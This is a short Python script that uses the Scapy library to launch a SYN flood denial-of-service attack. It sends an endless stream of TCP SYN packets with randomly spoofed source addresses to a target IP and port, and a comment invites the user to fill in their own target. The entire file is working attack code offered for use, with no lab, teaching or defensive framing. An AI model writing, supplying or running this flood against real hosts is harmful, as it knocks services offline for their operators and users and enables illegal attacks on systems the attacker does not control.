from scapy.all import RandIP, IP, TCP, send, RandShort

# Target IP and port
target_ip = "192.10.1.1" #your target ip
target_port = 80  #port number

def syn_flood(target_ip, target_port):
    src_ip = str(RandIP())  # Random source IP
    ip = IP(src=src_ip, dst=target_ip)
    syn = TCP(sport=RandShort(), dport=target_port, flags="S", seq=1000)
    pkt = ip / syn
    send(pkt, loop=1, verbose=0)  # Flood the target

# Start the SYN flood attack
syn_flood(target_ip, target_port)
